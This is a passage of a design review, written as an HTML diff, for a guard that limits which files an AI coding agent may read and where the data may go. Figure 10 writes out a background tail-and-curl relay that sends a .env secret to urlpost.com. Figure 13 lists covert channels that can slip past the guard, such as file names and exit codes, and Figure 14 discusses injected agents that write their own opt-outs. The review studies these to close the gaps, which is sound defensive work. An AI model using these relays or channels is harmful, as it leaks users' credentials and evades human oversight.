+  <tbody>
+    <tr><td class="k">external LLM</td><td><code>README.md</code></td><td><code>contract.pdf</code> (rung 3 possible), <code>customers.csv</code>, <code>.env</code>, <code>~/.my.cnf</code></td><td>no-model and local-model data at rung 3: hard deny</td></tr>
+    <tr><td class="k">quarantined helper</td><td><code>README.md</code>, <code>contract.pdf</code></td><td>everything else</td><td>local-model and no-model: never sent to it</td></tr>
+    <tr><td class="k">local LLM</td><td><code>README.md</code>, <code>contract.pdf</code>, <code>customers.csv</code></td><td><code>.env</code>, <code>~/.my.cnf</code></td><td>no-model: hard deny</td></tr>
+    <tr><td class="k"><code>github.com</code></td><td><code>README.md</code>, <code>.env</code> (bound)</td><td>n/a</td><td>everything else: ask</td></tr>
+    <tr><td class="k"><code>gmail.com</code></td><td><code>README.md</code>, <code>contract.pdf</code> (bound)</td><td>n/a</td><td>everything else: ask</td></tr>
+    <tr><td class="k"><code>db.internal</code></td><td><code>README.md</code>, <code>~/.my.cnf</code> (bound)</td><td>n/a</td><td>everything else: ask</td></tr>
+    <tr><td class="k"><code>sync:dropbox</code> <span class="muted">(a synced folder)</span></td><td><code>README.md</code></td><td>a file of symbols</td><td>everything else: ask, at the write-open</td></tr>
+    <tr><td class="k"><code>attacker.com</code>, <code>urlpost.com</code></td><td><code>README.md</code></td><td>n/a</td><td>everything else: ask</td></tr>
+    <tr><td class="k">human</td><td>everything</td><td></td><td></td></tr>
+  </tbody>
+</table></div>
+<h3>(b) Openers: programs, at the read gate</h3>
+<div class="tw"><table>
+  <thead><tr><th>program</th><th>may open raw</th><th>twin only</th><th>refused (EACCES)</th></tr></thead>
+  <tbody>
+    <tr><td class="k">python3 running report.py</td><td><code>README.md</code>, <code>customers.csv</code>, <code>.env</code> (its call then holds them)</td><td><code>contract.pdf</code> (no reader list); any copy it writes, until a human names an opener</td><td><code>~/.my.cnf</code> (the list names mysql only)</td></tr>
+    <tr><td class="k">mysql</td><td><code>README.md</code>, <code>~/.my.cnf</code> (its call then holds it)</td><td><code>contract.pdf</code></td><td><code>customers.csv</code>, <code>.env</code></td></tr>
+    <tr><td class="k">curl</td><td><code>README.md</code></td><td><code>contract.pdf</code></td><td><code>customers.csv</code>, <code>.env</code>, <code>~/.my.cnf</code></td></tr>
+    <tr><td class="k">git</td><td><code>README.md</code></td><td><code>contract.pdf</code>; committed versions of protected files are missing from its object store</td><td><code>customers.csv</code>, <code>.env</code>, <code>~/.my.cnf</code></td></tr>
+  </tbody>
+</table></div>
+<p class="note">An interpreter is an opener only with the script it runs: python3 with inline code (<code>python3 -c</code>), another script, or a renamed copy of python3 opens <code>.env</code> nowhere (Plan 13 §8 decision (b)). Openers do not travel. python3 opening <code>.env</code> grants nothing to any sink: where the bytes may go afterwards is table (a), read against the call's label. A copy python3 writes has no openers of its own.</p>
+<figcaption>Figure 7. The same policy as Figure 3, read per principal. The model rows are the levels, the destination rows the bindings, the program rows the reader lists. A reviewer asking "what can reach attacker.com?" or "what may curl open?" gets the answer from one row.</figcaption>
+</figure>
+
+<!-- ============ Figure 8 ============ -->
+<h2>Figure 8. Explorer: pick an object, a holder and a sink</h2>
+<figure>
+<div class="ex" id="explorer">
+  <div class="ex-controls">
+    <label for="ex-obj">object <select id="ex-obj">
+      <option value="readme">README.md (public)</option>
+      <option value="contract">docs/contract.pdf (any-model)</option>
+      <option value="customers">data/customers.csv (local-model)</option>
+      <option value="env" selected>.env (no-model)</option>
+      <option value="mycnf">~/.my.cnf (no-model)</option>
+      <option value="promptReg">user prompt with a pasted token, registered (.env's value)</option>
+      <option value="promptUnreg">user prompt with a pasted token, unregistered</option>
+    </select></label>
+    <label for="ex-sub">holder <select id="ex-sub">
+      <option value="agent">agent (Claude Code)</option>
+      <option value="python3">bash → python3</option>
+      <option value="proxy">python3 via the session's HTTPS proxy</option>
+      <option value="pipe" selected>python3 … | curl … (pipeline)</option>
+      <option value="curl">bash → curl</option>
+      <option value="mysql">mysql</option>
+      <option value="git">bash → git show</option>
+    </select></label>
+    <label for="ex-sink">sink <select id="ex-sink">
+      <option value="ext">external LLM</option>
+      <option value="helper">quarantined helper</option>
+      <option value="local">local LLM</option>
+      <option value="github.com">github.com</option>
+      <option value="gmail.com">gmail.com</option>
+      <option value="db.internal">db.internal:3306</option>
+      <option value="attacker.com">attacker.com</option>
+      <option value="urlpost.com" selected>urlpost.com</option>
+      <option value="human">human terminal</option>
+      <option value="store">write ~/ws/out/copy.txt</option>
+      <option value="sync">write ~/Dropbox/copy.txt (sync:dropbox)</option>
+    </select></label>
+    <div class="ex-mode" role="group" aria-label="design">
+      <button type="button" id="ex-today" aria-pressed="true">today</button>
+      <button type="button" id="ex-plan" aria-pressed="false">Plan 13</button>
+    </div>
+  </div>
+  <div class="ex-steps">
+    <div class="ex-step"><div class="ex-h">1 · READ</div><div id="ex-read"></div></div>
+    <div class="ex-step"><div class="ex-h">2 · the holder now holds</div><div id="ex-hold"></div></div>
+    <div class="ex-step"><div class="ex-h" id="ex-h3">3 · SEND</div><div id="ex-send"></div></div>
+  </div>
+</div>
+<p class="note">The example policy of Figure 1. "Today" is the code as of 2026-09-30 (Plan 13 §2 and §3). "Plan 13" applies the revised design of §4: openers checked at the read gate, Release checked on every leg at the later event, derived labels by reference, synced folders as destinations, and the prompt scan for registered values. Programs reach models only through the tool result, which goes to the session's main model.</p>
+<figcaption>Figure 8. Every path is the same three questions: what the read gives the holder, what label the holder then carries, and whether that label admits the sink.</figcaption>
+</figure>
+
+<!-- ============ Figure 9 ============ -->
+<h2>Figure 9. How a user writes the policy</h2>
+<figure>
+<p>Most users never write the model down. They answer the questions it asks, and <code>policy.yaml</code> is the record of their answers (Plan 13 §5).</p>
+<h3>(a) Four levels of effort</h3>
+<div class="tw"><table>
+  <thead><tr><th>layer</th><th>what the user does</th><th>what it sets</th><th>split</th></tr></thead>
+  <tbody>
+    <tr><td class="k">0. Nothing</td><td>install</td><td>the built-in catalog of credential files at <code>no-model</code>, no bindings, no openers</td><td><span class="muted">n/a</span></td></tr>
+    <tr><td class="k">1. Mark</td><td>the dashboard's file explorer, or Apply on a Plan 14 suggestion (<code>mandu policy suggest</code>); a <code>mandu protect</code> verb is proposed, not built</td><td>a level on a path</td><td><span class="chip ok">tightening</span> any client</td></tr>
+    <tr><td class="k">2. Answer</td><td>resolve an Inbox row: <i>Allow once</i>, <i>This session</i> or <i>Always</i></td><td>one binding or one opener, for the scope chosen</td><td><span class="chip ask">relaxation</span> the human</td></tr>
+    <tr><td class="k">3. Write</td><td>edit <code>policy.yaml</code>, or the dashboard's editor</td><td>everything, <code>output:</code> and per-value bindings included</td><td><span class="chip ask">relaxation</span> a relaxing edit is held as a proposal</td></tr>
+  </tbody>
+</table></div>
+
+<h3>(b) The file</h3>
+<p>The names stay (<code>paths</code>, <code>level</code>, <code>bindings</code>, <code>readers</code>, <code>others</code>). Two things change: a reader entry carries its own <code>output:</code> (D3), and a structured file may bind each value separately (<code>values:</code>).</p>
+<pre>paths:
+  - path: ~/proj/deploy.token
+    level: no-model                  <span class="cm"># no AI model may read it</span>
+    bindings: [db.internal:5432]     <span class="cm"># where its value may be sent</span>
+    readers:
+      - app: deploy                  <span class="cm"># may open it raw (pinned by path + hash on first use)</span>
+        prints: nothing              <span class="cm"># your word: deploy is not vetted (D8 (12))</span>
+        output: clear                <span class="cm"># deploy prints its status, not this file</span>
+
+  - path: ~/ws/app/.env
+    level: no-model
+    readers:
+      - app: python3                 <span class="cm"># an interpreter is a reader only with its script pinned</span>
+        script: /opt/tools/deploy.py
+    values:                          <span class="cm"># per value, for a structured file</span>
+      STRIPE_KEY: { bindings: [api.stripe.com] }
+      "AWS_*":    { bindings: ["*.amazonaws.com"] }
+
+  - path: ~/contracts/**
+    level: any-model                 <span class="cm"># the AI may read these when it asks (logged)</span>
+    bindings: [smtp.gmail.com]</pre>
+<p class="note">A holder that opened <code>.env</code> raw holds every value, so its label is the intersection over the values: the pinned <code>deploy.py</code> holding the whole file may send it nowhere without asking. This is the D1 rule applied inside one file. <code>stores:</code> and a separate <code>declassify:</code> are dropped.</p>
+
+<h3>(c) What the user reads back</h3>
+<p>Every rule is shown as sentences generated from the label, in the product's closed vocabulary, never as the lattice:</p>
+<div class="say"><b>~/ws/app/.env</b>: No AI model may read it. <code>node</code> may open it (note: <code>node</code> runs any code, so this lets any script do the same). <code>STRIPE_KEY</code> may be sent only to api.stripe.com; <code>AWS_*</code> only to *.amazonaws.com; a program holding the whole file may send it nowhere without asking. Copies made from it follow the same rules.</div>
+
+<h3>(d) An approval</h3>
+<div class="card" role="group" aria-label="An example Inbox row">
+  <div><code>node</code> (tool call "npm run deploy") wants to send data from <code>~/ws/app/.env</code> and <code>data/customers.csv</code> to <code>hooks.slack.com</code>.</div>
+  <div class="src"><code>.env</code> may go to: api.stripe.com, *.amazonaws.com (per value)</div>
+  <div class="src"><code>customers.csv</code> may go to: nowhere</div>
+  <div class="btns"><span class="btn pri">Deny</span><span class="btn">Allow once</span><span class="btn">Allow this session</span><span class="btn">Always: add hooks.slack.com to both</span></div>
+</div>
+<figcaption>Figure 9. Four layers of effort, from nothing to editing the file. Marking a path is a tightening any client may apply; answering an Inbox row or writing a relaxing rule is the human's. The row names every source the holder holds, so the intersection is visible rather than a surprise. An approval defaults to once; <i>Always</i> adds the binding to each source that lacks it, and the sentences of (c) change at once.</figcaption>
+</figure>
+
+<!-- ============ Review of the revision (2026-10-01) ============ -->
+<h2>What the revised plan still does not cover: a review <span class="muted">(2026-10-01)</span></h2>
+<p>The 2026-09-30 revision answered most of a first review of the 2026-09-28 draft: the check at the later of a flow's two events (§4.5), approvals that default to once (§4.7), the prompt scan narrowed to registered values (§4.8), synced folders as destinations (§4.6), <code>output:</code> on the (file, program) pair, the tree's holes (D7), the reader's identity (D8), and a stated boundary for the soundness claim (§4.9). Read against the revised text, five findings remain. The first is a counterexample to §6.3 item 1 that lies <i>inside</i> the boundary §4.9 draws; the others are requirements the model leaves unstated, or a boundary drawn wider than it needs to be. Each names the §7 step it changes. Facts about the code are as of 2026-10-01.</p>
+<div class="tw"><table>
+  <thead><tr><th>finding</th><th>figure</th><th>kind</th><th>changes §7</th></tr></thead>
+  <tbody>
+    <tr><td class="k">R1 the reader that already holds the descriptor</td><td>10</td><td>security: a leak under §4.5 and §4.6 as written</td><td>step 1 (a test), step 6 (the rule)</td></tr>
+    <tr><td class="k">R2 <i>Always</i> on a row with several sources</td><td>11</td><td>model: §5.4 widens a source whose label said "nowhere" with one click</td><td>step 10</td></tr>
+    <tr><td class="k">R3 the session holder's intersection</td><td>12</td><td>usability cliff with no view and no ask before it; D1's session twin is missing from §3</td><td>steps 4, 10</td></tr>
+    <tr><td class="k">R4 the boundary of §4.9, and the exits not named</td><td>13</td><td>coverage: one excluded channel is cheap to close; four exits have no disposition</td><td>steps 1, 12</td></tr>
+    <tr><td class="k">R5 three smaller findings</td><td>14</td><td>the opt-out's plane, the interpreter's identity, the catalog's bindings</td><td>steps 7, 8, §5.1</td></tr>
+    <tr><td class="k">how to address each</td><td>15</td><td>mechanism, decision, test, step</td><td></td></tr>
+  </tbody>
+</table></div>
+
+<!-- ============ Figure 10 ============ -->
+<h2>Figure 10. Two holders, one file: the reader that already holds the descriptor</h2>
+<figure>
+<p>§4.5 keeps, per holder, the sinks <i>that holder</i> opened, and re-judges them when the holder reads something new. It says nothing about the other direction: a file that a second holder already has open for reading is a channel out of the first holder, and no event of the second holder ever fires. A process that outlives its tool call is a holder of its own (§4.4), started by the session and therefore inside §4.9's boundary.</p>
+<div class="fig">
+<svg viewBox="0 0 960 290" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 10: a long-lived tail and curl from call 1 carry bytes that python3 from call 2 appends to a file both hold">
+  <text class="m" x="16" y="18">call 1 (backgrounded):  tail -f /tmp/x | curl --data-binary @- https://urlpost.com &amp;</text>
+  <text class="m" x="16" y="34">call 2:                 python3 -c 'print(open(".env").read())' &gt;&gt; /tmp/x</text>
+  <text class="s11 muted" x="16" y="50">call 1 returns at once; its tree keeps running as a long-lived holder, untainted, started by the session</text>
+  <!-- lanes -->
+  <text class="b" x="16" y="84">python3</text>
+  <text class="s11 muted" x="16" y="98">holder: call 2</text>
+  <text class="b m" x="16" y="134">/tmp/x</text>
+  <text class="b" x="16" y="184">tail</text>
+  <text class="s11 muted" x="16" y="198">holder: call 1</text>
+  <text class="b" x="16" y="234">curl</text>
+  <text class="s11 muted" x="16" y="248">holder: call 1</text>
+  <path class="ln-sep" d="M110,80 H944 M110,130 H944 M110,180 H944 M110,230 H944"/>
+  <!-- t0 tail opens /tmp/x for reading -->
+  <rect class="bx" x="120" y="166" width="150" height="28"/>
+  <text class="c m" x="195" y="184">open("/tmp/x") read</text>
+  <text class="c s11 muted" x="195" y="208">untainted, no label yet</text>
+  <!-- t1 curl connects -->
+  <rect class="bx" x="290" y="216" width="160" height="28"/>
+  <text class="c m" x="370" y="234">connect(urlpost.com)</text>
+  <text class="c s11 muted" x="370" y="258">passes: a clean holder</text>
+  <!-- t2 python3 opens .env raw -->
+  <rect class="bx-secret" x="460" y="66" width="140" height="28"/>
+  <text class="c m" x="530" y="84">open(".env") raw</text>
+  <text class="c s11 secret" x="530" y="108">Label(call 2) = Release(.env)</text>
+  <!-- t3 python3 opens /tmp/x append -->
+  <rect class="bx-secret-o" x="620" y="66" width="180" height="28"/>
+  <text class="c m" x="710" y="84">open("/tmp/x", O_APPEND)</text>
+  <path class="ln-secret" d="M710,94 V138"/>
+  <text class="c s11 secret" x="710" y="152">/tmp/x = ref{.env} (§4.6)</text>
+  <!-- t4 python3 writes -->
+  <rect class="bx-secret-o" x="820" y="66" width="120" height="28"/>
+  <text class="c m" x="880" y="84">write(fd, key)</text>
+  <path class="ln-secret" d="M880,94 V138"/>
+  <text class="c s11 secret" x="880" y="152">secret bytes</text>
+  <!-- t5 tail reads without an open, pipes to curl, curl sends -->
+  <path class="ln-secret" d="M880,156 V164"/>
+  <rect class="bx-secret-o" x="820" y="166" width="120" height="28"/>
+  <text class="c m" x="880" y="184">read(fd): no event</text>
+  <path class="ln-secret" d="M880,194 V214"/>
+  <rect class="bx-secret-o" x="800" y="216" width="150" height="28"/>
+  <text class="c m" x="875" y="234">send → urlpost.com</text>
+  <!-- time axis -->
+  <path class="ln ln-a" d="M110,270 H944"/>
+  <text class="c s11" x="195" y="286">t0</text>
+  <text class="c s11" x="370" y="286">t1</text>
+  <text class="c s11" x="530" y="286">t2</text>
+  <text class="c s11" x="710" y="286">t3</text>
+  <text class="c s11" x="880" y="286">t4, t5</text>
+  <text class="e s11 muted" x="944" y="286">time</text>
+</svg>
+</div>
+<div class="verdicts">
+  <div class="v-bad">today</div>
+  <div>Call 1's tree never opens a labeled file, so it is never tainted, and curl's <code>connect()</code> at t1 passes. Call 2 is tainted, and the only gate it meets is the write-open at t3, which labels <code>/tmp/x</code> if the path is governed at all. tail already holds the descriptor: its <code>read(2)</code> at t5 is not intercepted. The bytes leave.</div>
+  <div class="v-bad">Plan 13 §4.5 and §4.6, as revised</div>
+  <div>The same leak. Call 1's tree is a holder; call 2's is another. Call 2's raw read at t2 is a source event, and §4.5 re-judges the sinks <i>call 2</i> has open (none). The write-open at t3 is a storage sink, always admitted, and <code>/tmp/x</code> takes <code>ref{.env}</code>. Call 1's holder has <code>/tmp/x</code> open for reading, not for writing, so it is in no holder's open-sink table; its read at t5 is no event, and its connection at t1, to a destination outside <code>Release(.env)</code>, is never re-judged. The label checked at the exit (call 1's: every sink) is weaker than the lattice's: a counterexample to §6.3 item 1, inside §4.9's boundary (this relay was started by the session).</div>
+  <div class="v-ok">the rule</div>
+  <div>A file taking a label is an event for every holder that has it open for reading. The guard keeps the reverse index (file → holders reading it) beside §4.5's per-holder open-sink table. At t3, call 1's holder takes <code>Release(.env)</code>; it already has a sink open outside that label (curl's connection), so the write-open at t3, the later event, is refused or held as an ask. Same shape: a listening socket or AF_UNIX peer started in call 1 (the listener found by socket inode, no root), a FIFO, a file under <code>/dev/shm</code>. The fail-closed first form needs no reverse judgement: <i>a tainted holder may not write-open a governed file that another holder has open for reading, unless that holder is an opener of every datum the writer holds</i>.</div>
+</div>
+<figcaption>Figure 10. Two holders, one file. §4.5 re-judges a holder's own open sinks at its own source events; a second holder that already reads the file has no event at all. Labeling a file must be an event for every holder reading it, and the write that labels it is then the later event of Figure 4. §7 step 1 needs this test beside D2, D5 and D6; step 6's open-sink table needs its reverse index.</figcaption>
+</figure>
+
+<!-- ============ Figure 11 ============ -->
+<h2>Figure 11. <i>Always</i> on a row with several sources</h2>
+<figure>
+<p>§4.7 fixed the scope of an approval (once by default; <i>Always</i> is the human's relaxation), and §5.4's row names every source the holder holds so the intersection is visible. One thing in that row is still too wide: its <i>Always</i> adds the destination to <b>every</b> source, including the one whose label said "nowhere". The row was composed by the agent's action, and the source that blocks is the one whose label the human never meant to change.</p>
+<h3>(a) §5.4 as revised</h3>
+<div class="card" role="group" aria-label="The Inbox row of Plan 13 §5.4">
+  <div><code>node</code> (tool call "npm run deploy") wants to send data from <code>~/ws/app/.env</code> and <code>data/customers.csv</code> to <code>hooks.slack.com</code>.</div>
+  <div class="src"><code>.env</code> may go to: api.stripe.com, *.amazonaws.com (per value)</div>
+  <div class="src"><code>customers.csv</code> may go to: nowhere</div>
+  <div class="btns"><span class="btn pri">Deny</span><span class="btn">Allow once</span><span class="btn">Allow this session</span><span class="btn">Always: add hooks.slack.com to both</span></div>
+</div>
+<p class="note"><span class="chip deny">too wide</span> One click writes <code>bindings: [hooks.slack.com]</code> on <code>customers.csv</code>, a <code>local-model</code> file that had no destination at all. Its first binding is a larger act than one more binding on <code>.env</code>, and the row does not say which of the two sources is the one that blocks.</p>
+<h3>(b) per source, and the blocking source named</h3>
+<div class="card" role="group" aria-label="The same row, with Always per source">
+  <div><code>node</code> (tool call "npm run deploy") wants to send data from <code>~/ws/app/.env</code> and <code>data/customers.csv</code> to <code>hooks.slack.com</code>.</div>
+  <div class="src"><code>.env</code> may go to: api.stripe.com, *.amazonaws.com — <b>not</b> hooks.slack.com</div>
+  <div class="src"><code>customers.csv</code> may go to: nowhere — <b>this is the file that stops it</b>; it has never been allowed anywhere</div>
+  <div class="btns"><span class="btn pri">Deny</span><span class="btn">Allow once</span><span class="btn">Allow this session</span><span class="btn">Always for .env</span><span class="btn">Always for customers.csv (its first destination)</span></div>
+</div>
+<p class="note"><span class="chip ok">rule</span> <i>Always</i> is per source; the send proceeds only when every source allows the destination, so one answer never widens a label the human did not name. A source with no bindings at all gets its first one through a labeled button, or through the file's own rule (§5.2), never through a button that also covers another file. The row states which source blocks and why. The scope vocabulary (once / session / always) stays as §4.7 has it.</p>
+<figcaption>Figure 11. The row of §5.4 with one change: <i>Always</i> per source, the blocking source named. §4.7's "an injected agent can generate asks on purpose" is the reason: the ask is the agent's, the widening should be the human's, one file at a time. §7 step 10.</figcaption>
+</figure>
+
+<!-- ============ Figure 12 ============ -->
+<h2>Figure 12. The session holder: intersection with no view and no warning</h2>
+<figure>
+<p>§4.4 makes the session a holder: each rung 3 read shrinks <code>Label(session)</code> to <code>∩ Release(d)</code>, destinations included. §4.3 says the watermark is a <code>max</code>, which is true on the model column only. The consequence on the destination column is a cliff, and the plan gives it no view and no warning: after two in-context reads of files with different bindings, both asked for by the user, the session can deliver nothing anywhere without an ask, and no single rule explains why.</p>
+<div class="fig">
+<svg viewBox="0 0 960 230" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 12: the session holder's label after two in-context reads of any-model files with different bindings">
+  <rect class="bx" x="16" y="40" width="150" height="60"/>
+  <text class="c b" x="91" y="60">session starts</text>
+  <text class="c s11" x="91" y="76">Label = every sink</text>
+  <text class="c s11 muted" x="91" y="91">no watermark</text>
+
+  <path class="ln-secret" d="M166,70 H258"/>
+  <text class="c s11" x="212" y="50">rung 3 read</text>
+  <text class="c s11 m" x="212" y="63">contract.pdf</text>
+
+  <rect class="bx-mid" x="260" y="40" width="256" height="60"/>
+  <text class="c b" x="388" y="60">session</text>
+  <text class="c m" x="388" y="76">{every model, human, gmail.com}</text>
+  <text class="c s11 muted" x="388" y="91">any-model · bind gmail.com</text>
+
+  <path class="ln-secret" d="M516,70 H598"/>
+  <text class="c s11" x="557" y="50">rung 3 read</text>
+  <text class="c s11 m" x="557" y="63">pricing.xlsx</text>
+
+  <rect class="bx-secret" x="600" y="40" width="256" height="60"/>
+  <text class="c b" x="728" y="60">session</text>
+  <text class="c m" x="728" y="76">{every model, human}</text>
+  <text class="c s11 muted" x="728" y="91">gmail.com ∩ sheets.google.com = ∅</text>
+
+  <path class="ln ln-a ln-d" d="M856,70 H936"/>
+  <text class="c s11 muted" x="896" y="62">until the</text>
+  <text class="c s11 muted" x="896" y="88">session ends</text>
+
+  <text class="c s11" x="91" y="124">push, mail, write: fine</text>
+  <text class="c s11" x="388" y="124"><tspan class="ok">mail to gmail.com: allowed</tspan></text>
+  <text class="c s11" x="388" y="139"><tspan class="mid">git push github.com: ask</tspan></text>
+  <text class="c s11" x="388" y="154"><tspan class="mid">every written file: ref{contract.pdf}</tspan></text>
+  <text class="c s11" x="728" y="124"><tspan class="secret">mail to gmail.com: ask (it was allowed a minute ago)</tspan></text>
+  <text class="c s11" x="728" y="139"><tspan class="secret">git push, any destination: ask</tspan></text>
+  <text class="c s11" x="728" y="154"><tspan class="secret">every written file: ref{contract.pdf, pricing.xlsx}</tspan></text>
+  <text class="c s11" x="728" y="169"><tspan class="secret">nothing widens it but an answer to an ask</tspan></text>
+  <text class="s11 muted" x="16" y="200">Both files are any-model and both reads were the user's. Today (session-labels.ts, raise) the watermark is max(level) with the UNION of bindings: both destinations stay</text>
+  <text class="s11 muted" x="16" y="214">allowed, which is D1 for the session holder; §3's D1 names taintedProcessBindings only, and §7 step 4 would fix one of the two.</text>
+</svg>
+</div>
+<div class="verdicts">
+  <div class="v-mid">Plan 13 as revised</div>
+  <div>§4.4's intersection is the sound choice (a paraphrase of both files has no symbol for any gate to catch), and §4.7's <i>Allow this session</i> is a release: the human can answer the ask that the cliff produces. What is missing is before and around the ask: the plan does not say in words that the session's destinations intersect (§4.3 says <code>max</code>), the session's label is nowhere on screen, the rung 3 read that will empty the destinations is silent, and the ask's row (§5.4) is specified for a process holder, not for the session, so it does not list the declassified files that exclude the destination. And D1 has a session twin the revision did not list: <code>SessionLabels.raise</code> unions bindings.</div>
+  <div class="v-ok">needed</div>
+  <div>(1) D1 names both sites; step 4 fixes both. (2) §4.3 says the destination column of the session intersects. (3) The session's label is on the product page with the files that set it: "this session has read <code>contract.pdf</code> and <code>pricing.xlsx</code>; it can deliver only to you until you say otherwise". (4) A rung 3 read whose label would leave the session no destination is itself an ask before it happens ("reading this will confine the session"). (5) An ask caused by the session holder lists the declassified files as §5.4 lists a process's sources, and names the one that excludes the destination.</div>
+</div>
+<figcaption>Figure 12. The session holder under §4.4. Intersection is right and produces a cliff after two reads the user asked for; the revision gives the human a way out (<i>Allow this session</i>) but no view of the label, no warning before the read that empties it, and no row that names the excluding file. Today's watermark unions bindings, the session twin of D1. §7 steps 4 and 10.</figcaption>
+</figure>
+
+<!-- ============ Figure 13 ============ -->
+<h2>Figure 13. The boundary of §4.9, and the exits not named</h2>
+<figure>
+<p>§4.9 draws the boundary of the soundness claim, which the draft lacked. Two remarks on it. (a) One excluded channel, file names, is a real exfiltration path that is cheap to close, and one exclusion, exit codes, is wider than the code: the proxy already masks the whole result block. (b) §4.6 names synced folders and §4.9 names host daemons; four exits that turn a write into a send have no disposition.</p>
+<h3>(a) Channels from a tainted holder back to the model, against §4.9</h3>
+<div class="tw"><table>
+  <thead><tr><th>channel</th><th>example, with <code>readers: [python3]</code> on <code>.env</code></th><th>capacity per call</th><th>§4.9</th><th>today (<code>rewrite-request.ts</code>)</th><th>suggested</th></tr></thead>
+  <tbody>
+    <tr><td class="k">stdout, stderr</td><td><code>print(key)</code>, <code>sys.stderr.write(key)</code></td><td>unbounded</td><td>covered (the fold)</td><td><span class="chip ok">masked</span> rule <code>secret</code> replaces the whole result content (<code>maskWhole</code>)</td><td>say that "output" is the whole block; pin it with a test</td></tr>
+    <tr><td class="k">exit code</td><td><code>sys.exit(ord(key[0]))</code></td><td>8 bits</td><td>excluded</td><td><span class="chip ok">masked</span> the "exit code" line is inside the block; the residual is the block's <code>is_error</code> flag, one bit</td><td>narrow the exclusion to <code>is_error</code>; force it false on a masked result, or accept one bit</td></tr>
+    <tr><td class="k">file names</td><td><code>open(key, "w")</code>, then <code>ls</code> in the next call</td><td>255 bytes per name, unbounded names</td><td>excluded</td><td><span class="chip deny">open</span> the write gate labels content; the name comes back as public through the next call's <code>ls</code></td><td>register the names a tainted holder creates as session secrets, so the verbatim backstop masks them in later results; cheap, and it removes the one unbounded channel from the excluded list</td></tr>
+    <tr><td class="k">file size, mtime, existence</td><td><code>truncate(f, key_byte)</code>, then <code>stat</code></td><td>a few bits</td><td>excluded</td><td><span class="chip sym">accepted</span></td><td>keep excluded</td></tr>
+    <tr><td class="k">timing</td><td><code>sleep(key_byte)</code></td><td>a few bits, noisy</td><td>excluded</td><td><span class="chip sym">accepted</span></td><td>keep excluded</td></tr>
+  </tbody>
+</table></div>
+<h3>(b) Exits the write gate sees as a path</h3>
+<div class="tw"><table>
+  <thead><tr><th>exit</th><th>why the gate misses it</th><th>the plan</th><th>disposition to record</th></tr></thead>
+  <tbody>
+    <tr><td class="k">a synced folder</td><td>the reader is a daemon outside the session</td><td>§4.6: a destination <code>sync:&lt;name&gt;</code>; step 12</td><td>done</td></tr>
+    <tr><td class="k">a network filesystem (NFS, CIFS, sshfs, FUSE, WSL <code>drvfs</code>)</td><td>the write is a send at the VFS, with no <code>connect()</code></td><td>§4.6: built 2026-10-03 (§9 R4 (b)), refused unless bound; 2026-10-04 an overlay by its upper layer, a holder's names and attributes there, and a writable descriptor of a file there passed to a holder</td><td>the same rule as a synced folder: mount types from <code>/proc/self/mountinfo</code> are destinations <code>mount:&lt;fstype&gt;:&lt;source&gt;</code></td></tr>
+    <tr><td class="k">another local user; a world-readable derived file</td><td>the other user's processes are not interposed</td><td>§4.6: built 2026-10-03; the guard (which holds the descriptor) writes it with no group or other bits, and refuses a chmod or ACL that reopens it</td><td>a derived file is written <code>0600</code> by the arbiter (same user, no root); a label on a file that stays wider is an ask</td></tr>
+    <tr><td class="k">the clipboard, the display server</td><td><code>xclip</code> / <code>wl-copy</code> writes to an AF_UNIX socket the guard already sees</td><td>§4.9: already a destination (a holder reaches only its <code>unix:</code> bindings); pinned by a test 2026-10-03</td><td>the display socket is a destination; a tainted holder may not connect to it unless bound (the launcher's wrap documents the exclusion for the interactive agent)</td></tr>
+    <tr><td class="k">the agent's transcript on disk</td><td>the agent writes it from memory, holding the raw prompt</td><td>§4.8: the backstop matcher runs on every request</td><td>done, once the shared matcher of §4.8 lands</td></tr>
+    <tr><td class="k">a printer, a serial port, a USB device</td><td>a device node is a write with no label</td><td>§4.9: enforced 2026-10-03, a holder writes to no device but the terminal and the sinks that keep nothing (2026-10-04: nor to one passed to it)</td><td>documented as outside the guarantee, in §4.9</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 13. §4.9's boundary, checked against the code and the exits. File names are the one excluded channel with unbounded capacity, and closing it is a registration, not a new gate; exit codes are already inside the masked block. Four exits that make a path into a send need a sentence each in §4.6 or §4.9. §7 steps 1 and 12.</figcaption>
+</figure>
+
+<!-- ============ Figure 14 ============ -->
+<h2>Figure 14. Three smaller findings</h2>
+<figure>
+<div class="tw"><table>
+  <thead><tr><th>finding</th><th>where</th><th>the gap</th><th>what to decide</th></tr></thead>
+  <tbody>
+    <tr><td class="k">the prompt opt-out's plane</td><td>§4.8 "one explicit act lets it through, logged"</td><td>The act's plane is not named. If it is anything the agent can write (a phrase in a prompt, a tool call), an injected agent performs it: the model composes the "explicit act" itself. §4.7's monotonic split already says a relaxation is the human's, on the human plane.</td><td>The opt-out is an Inbox row or a dashboard action, never in-band; the plan says so in §4.8 and step 7's e2e test includes an agent-written opt-out that does not work.</td></tr>
+    <tr><td class="k">an interpreter as opener: warn, or identify the script</td><td>D8, §7 step 8 ("the dashboard warns when a reader is a shell or an interpreter")</td><td>A warning leaves <code>readers: [node]</code> meaning "any script". The exec identifier already reduces <code>python3 x.py</code> to <code>x.py</code> (<code>exec-identifier.ts</code>, lifted from the reference) and marks inline code (<code>-c</code>, <code>-e</code>) unresolvable; the open gate does not use it.</td><td>An interpreter opener is pinned as <code>(interpreter, script path + hash)</code>; inline code resolves to no opener and gets the twin. Step 8 does this beside the loader-environment check; the warning stays for a bare interpreter entry a human insists on.</td></tr>
+    <tr><td class="k">the catalog ships no bindings</td><td>§5.1 layer 0: "no bindings, no openers"; <code>secret-catalog.ts</code> "Phase A ships none"</td><td>Plan 10 §11.3 ships the canonical <i>consumers</i> so that day one needs no prompt for <code>aws</code> or <code>psql</code>; the canonical <i>destinations</i> are as fixed (<code>*.amazonaws.com</code>, <code>github.com</code>, <code>registry.npmjs.org</code>, <code>upload.pypi.org</code>) and are not shipped, so layer 0 asks at the first use of every credential.</td><td>Fill <code>bindings</code> on the catalog rows that have a canonical host; a user entry overrides, as a user reader overrides a consumer. Step 4 (the intersection) is where a shipped binding first matters.</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 14. Three findings that need a sentence each: where the opt-out lives, what an interpreter opener is, and a default the catalog could ship.</figcaption>
+</figure>
+
+<!-- ============ Figure 15 ============ -->
+<h2>Figure 15. How to address each finding</h2>
+<figure>
